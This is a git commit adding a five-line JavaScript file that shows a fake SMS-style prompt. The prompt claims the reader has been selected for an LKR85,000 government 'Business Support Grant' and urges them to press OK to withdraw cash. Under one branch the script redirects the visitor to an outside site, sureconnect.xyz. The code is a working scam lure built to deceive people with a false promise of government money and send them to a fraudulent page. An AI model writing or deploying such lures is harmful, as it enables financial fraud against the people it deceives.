6e477d3805d62f9d4f9e0a23f72876171faf961d
ekpeitidmi <ekpeitidmi@gmail.com>
2025-05-30 05:36:55 -0700

    Create activation-grantrewards.js

---
+++ activation-grantrewards.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW LKR85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive LKR85,000 Business Support Grant from Government, Press Ok to withdraw cash Now ','WITHDRAW LKR85,000');
+if (password != 'WITHDRAW LKR85,000') {
+location.href='https://sureconnect.xyz/grantrewards.html';
+}
